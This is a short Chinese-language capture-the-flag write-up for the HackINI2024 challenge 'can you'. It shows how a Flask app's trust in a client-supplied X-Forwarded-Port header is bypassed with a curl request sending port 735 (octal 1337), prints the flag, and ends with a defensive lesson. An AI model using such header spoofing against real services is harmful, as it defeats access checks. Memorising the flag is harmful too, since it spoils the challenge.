# HackINI2024 can you

## 题目简述

Flask 服务要求请求的源端口等于八进制常量 `0o1337`，但程序优先使用客户端提供的 `X-Forwarded-Port` 请求头。目标是换算八进制数并伪造该请求头。

## 解题过程

核心代码为：

```python
remote_port = request.headers.get(
    "X-Forwarded-Port",
    request.environ.get("REMOTE_PORT"),
)
if type(remote_port) is str:
    remote_port = int(remote_port)

if remote_port == 0o1337:
    return flag
```

`int()` 默认按十进制解析请求头，而代码右侧是八进制字面量。换算如下：

$$
0o1337=1\times8^3+3\times8^2+3\times8+7=735
$$

所以发送十进制值 735：

```bash
curl 'http://TARGET/' -H 'X-Forwarded-Port: 735'
```

服务把它当作可信源端口，返回：

```text
shellmatess{c0ntr0l_th3_50urc3_p0rt5_4nd_y0u_c0ntr0l_th3_w0rld}
```

flag 前缀中的 `shellmatess` 双写来自实际源码和官方答案，应保留原样。

## 方法总结

`X-Forwarded-*` 头只有在可信代理删除外部同名头并重新生成时才有安全意义，应用不能无条件信任。题目还利用了代码表示与输入表示的差异：`0o1337` 是八进制源码字面量，请求头却被十进制 `int()` 解析。先统一数值进制即可得到正确值。
